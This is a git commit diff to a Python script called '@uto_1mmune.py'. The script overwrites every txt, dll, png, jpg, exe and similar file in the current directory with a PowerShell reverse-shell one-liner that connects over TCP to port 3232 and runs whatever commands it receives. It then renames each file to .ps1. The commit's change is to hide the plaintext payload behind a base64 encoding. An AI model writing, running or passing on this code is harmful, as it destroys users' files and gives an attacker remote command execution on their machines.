9bf2fb83bd5011af64c12b8d87e3f4d2c41f7ab3
CodePontiff <45843121+CodePontiff@users.noreply.github.com>
2024-03-12 13:39:31 +0700

    @uto_1mmune.py

--- @uto_1mmune.py
+++ @uto_1mmune.py
@@ -1,19 +1,17 @@
 import os
 import glob
+import base64
 
 current_directory = os.getcwd()
 
-file_extensions = ["txt", "dat", "log", "dll", "png", "jpg", "jpeg", "exe"]  # Add or remove extensions as needed
+file_extensions = ["txt", "dat", "log", "dll", "png", "jpg", "jpeg", "exe"]
 
 file_paths = []
 for ext in file_extensions:
     file_paths.extend(glob.glob(os.path.join(current_directory, f"*.{ext}")))
 
 for file_path in file_paths:
-    with open(file_path, 'r+') as file:
-        file.truncate(0)
-        file.seek(0, 2)
-        file.write("powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('0.0.0.0',3232);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
-
+    with open(file_path, 'wb') as file:  # Open in binary mode for writing base64
+        file.write(b"powershell -nop -c " + base64.b64decode(" JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMC4wLjAuMCcsMzIzMik7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQ=="))
     new_file_path = os.path.splitext(file_path)[0] + ".ps1"
     os.rename(file_path, new_file_path)
